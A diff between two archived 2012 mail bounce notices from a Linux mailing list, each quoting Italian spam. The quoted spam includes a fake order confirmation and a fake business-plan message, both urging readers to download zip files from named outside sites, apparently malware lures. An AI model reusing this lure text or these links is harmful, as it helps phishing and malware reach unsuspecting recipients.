@@ -1,7 +1,7 @@
-From: MAILER-DAEMON-mVrslVNv4LdwCRcL5F1ibV6hYfS7NtTn@public.gmane.org
+From: MAILER-DAEMON-PETktZLjMbJcQSlrj/ZXAZEiL7xb53d6@public.gmane.org
 Subject: failure notice
-Date: 2 Apr 2012 20:54:20 -0000
-Message-ID: <20120402205426.A633682F@mail.linuxfoundation.org>
+Date: 2 Apr 2012 20:54:12 -0000
+Message-ID: <20120402210056.78C83833@mail.linuxfoundation.org>
 Mime-Version: 1.0
 Content-Type: text/plain; charset="us-ascii"
 Content-Transfer-Encoding: 7bit
@@ -18,53 +18,59 @@ Errors-To: containers-bounces-cunTk1MwBs9QetFLy7KEm3xJsTq8ys+cHZ5vskTnxNA@public
 To: containers-cunTk1MwBs9QetFLy7KEm3xJsTq8ys+cHZ5vskTnxNA@public.gmane.org
 List-Id: containers.vger.kernel.org
 
-Hi. This is the qmail-send program at smtplq03.aruba.it.
+Hi. This is the qmail-send program at authsmtp.register.it.
 I'm afraid I wasn't able to deliver your message to the following addresses.
 This is a permanent error; I've given up. Sorry it didn't work out.
 
-<miltkroes-85SetLuQ2XY1GQ1Ptb7lUw@public.gmane.org>:
-62.149.128.72 does not like recipient.
-Remote host said: 511 sorry, no mailbox here by that name (#5.1.1 - chkuser)
-Giving up on 62.149.128.72.
+<meant5-VGgt2q2+T+FeoWH0uzbU5w@public.gmane.org>:
+212.52.84.185 does not like recipient.
+Remote host said: 550 #5.1.0 Address rejected meant5-VGgt2q2+T+FeoWH0uzbU5w@public.gmane.org
+Giving up on 212.52.84.185.
+
+<meanwhile37-VGgt2q2+T+FeoWH0uzbU5w@public.gmane.org>:
+212.52.84.173 does not like recipient.
+Remote host said: 550 #5.1.0 Address rejected meanwhile37-VGgt2q2+T+FeoWH0uzbU5w@public.gmane.org
+Giving up on 212.52.84.173.
+
+<meantimea-VGgt2q2+T+FeoWH0uzbU5w@public.gmane.org>:
+212.52.84.96 does not like recipient.
+Remote host said: 550 #5.1.0 Address rejected meantimea-VGgt2q2+T+FeoWH0uzbU5w@public.gmane.org
+Giving up on 212.52.84.96.
+
+<meanvo-VGgt2q2+T+FeoWH0uzbU5w@public.gmane.org>:
+212.52.84.96 does not like recipient.
+Remote host said: 550 #5.1.0 Address rejected meanvo-VGgt2q2+T+FeoWH0uzbU5w@public.gmane.org
+Giving up on 212.52.84.96.
+
+<meantimeod-VGgt2q2+T+FeoWH0uzbU5w@public.gmane.org>:
+212.52.84.170 does not like recipient.
+Remote host said: 550 #5.1.0 Address rejected meantimeod-VGgt2q2+T+FeoWH0uzbU5w@public.gmane.org
+Giving up on 212.52.84.170.
 
 --- Below this line is a copy of the message.
 
 Return-Path: <containers-cunTk1MwBs9QetFLy7KEm3xJsTq8ys+cHZ5vskTnxNA@public.gmane.org>
-Received: (qmail 28366 invoked by uid 89); 2 Apr 2012 20:54:18 -0000
-Received: from unknown (HELO smtp4.aruba.it) (62.149.158.224)
-  by smtplq03.aruba.it with SMTP; 2 Apr 2012 20:54:18 -0000
-Received: (qmail 19733 invoked by uid 89); 2 Apr 2012 20:54:18 -0000
-Received: from unknown (HELO LOCAL.HOST) (info-Z6L1zN9jhgYpfdY6DShfjuSp9Cl8rx75@public.gmane.org@85.10.211.116)
-  by smtp4.ad.aruba.it with SMTP; 2 Apr 2012 20:54:18 -0000
-Received: from [10.0.0.100] by LOCAL.HOST id nv7bd1oBDDqq; Mon, 02 Apr 2012 22:54:18 +0200
-Message-ID: <007b01cd1112$c3763580$6400000a-7PjSQ+wCsSudNYLACK+ndg@public.gmane.org>
-From: "devnull" <containers-cunTk1MwBs9QetFLy7KEm3xJsTq8ys+cHZ5vskTnxNA@public.gmane.org>
-To: <miltila-EGIIDBWFGtqGzLJY+7CQzQ@public.gmane.org>
-Subject: Grazie per l'inserimento di un ordine con noi
-Date: Mon, 02 Apr 2012 22:54:18 +0200
+Received: (qmail 25749 invoked from network); 2 Apr 2012 20:54:05 -0000
+Received: from unknown (HELO LOCAL.HOST) (commerciale-UnDvy/LeJZY+5MJxiAk5rg@public.gmane.org@85.10.211.116)
+  by authsmtp.register.it with ESMTPA; 2 Apr 2012 20:54:05 -0000
+Received: from LOCAL.HOST (tON-53-38 [85.10.211.116]) by LOCAL.HOST (mailer) with SMTP id mxCaOTbxIOF9 for <meant5-VGgt2q2+T+FeoWH0uzbU5w@public.gmane.org>; Mon, 02 Apr 2012 22:54:04 +0200
+Date: Mon, 02 Apr 2012 22:54:04 +0200
+From: <containers-cunTk1MwBs9QetFLy7KEm3xJsTq8ys+cHZ5vskTnxNA@public.gmane.org>
+Message-ID: <82477735.68691982774319-7PjSQ+wCsSudNYLACK+ndg@public.gmane.org>
+To: <meant5-VGgt2q2+T+FeoWH0uzbU5w@public.gmane.org>
+Subject: {LINE[s6]}
 MIME-Version: 1.0
-Content-type: text/plain; charset=us-ascii 
+Content-type text/plain charset= iso-8859-1
 Content-Transfer-Encoding: 8bit
-X-Spam-Rating: smtp4.ad.aruba.it 1.6.2 0/1000/N
-X-Spam-Rating: smtplq03.aruba.it 1.6.2 0/1000/N
 
 
 
 
-Grazie per l'inserimento di un ordine con noi!
-
-Desideriamo informarLa che abbiamo ricevuto il vostro ordine e verra elaborato molto presto. Il vostro numero d'ordine e 433273-307308 e si dovrebbe essere consegnato entro 2-5 giorni lavorativi. Si prega di notare che nella maggior parte dei casi, la consegna e piu veloce indicato come vogliamo farvi iniziare a godere l'acquisto il piu presto possibile. Nel frattempo, si puo accedere al sito e verificare lo stato dell'ordine in qualsiasi momento tramite la pagina 'Il mio Account'.
-
-Se avete domande sul tuo ordine, non esitate a contattarci via email a support-47aCQaZas30gOMf6Bb8UDzHuokL47qeV33k9O5PiFbNhl2p70BpVqQ@public.gmane.org Non appena ordine e stato spedito, il nostro esecutivo Servizio Clienti monitorare i progressi e tenervi aggiornati in ogni momento.
-
-Richiedi il tuo premio speciale.
-
-Ancora una volta, vorremmo ringraziarvi per il vostro acquisto e speriamo di rivedervi presto.
-Fare clic sul seguente link per il pagamento e le informazioni di consegna
-http://aligndentals.com/hardware/Forma.zip
+su richiesta del vostro supervisore
+Vi inviamo un business plan con le letture dettagliate.
+http://ak-gunemlak.com/conteggio/Dettagli.zip?445428905
 
 
-
-A buon intenditor poche parole.
-Responsabile Servizio Clienti.
-your-gadgets.it
+==
+Non giudicare chi bussa alla tua porta dalla lunghezza della strada che ha percorso per arrivare da te.
+Societa di consulenza.
